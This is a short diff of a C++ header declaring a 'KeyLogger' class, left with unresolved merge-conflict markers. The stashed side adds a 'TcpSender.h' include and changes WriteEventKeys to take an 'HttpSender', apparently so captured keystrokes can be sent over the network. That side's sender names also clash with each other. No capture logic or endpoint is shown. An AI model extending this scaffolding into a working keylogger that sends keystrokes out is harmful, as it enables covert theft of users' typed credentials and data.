@@ -5,7 +5,12 @@
 #include <Windows.h>
 #include <string>
 #include <ostream>
+<<<<<<< Updated upstream
 
+=======
+#include "TcpSender.h"
+#include <Windows.h>
+>>>>>>> Stashed changes
 
 using std::vector;
 using std::ostream;
@@ -26,7 +31,11 @@ public:
     KeyLogger();
 	~KeyLogger();
 
+<<<<<<< Updated upstream
     void WriteEventKeys(ostream& buf /* out */);
+=======
+    void WriteEventKeys(HttpSender* sender);
+>>>>>>> Stashed changes
 };
 
 #endif
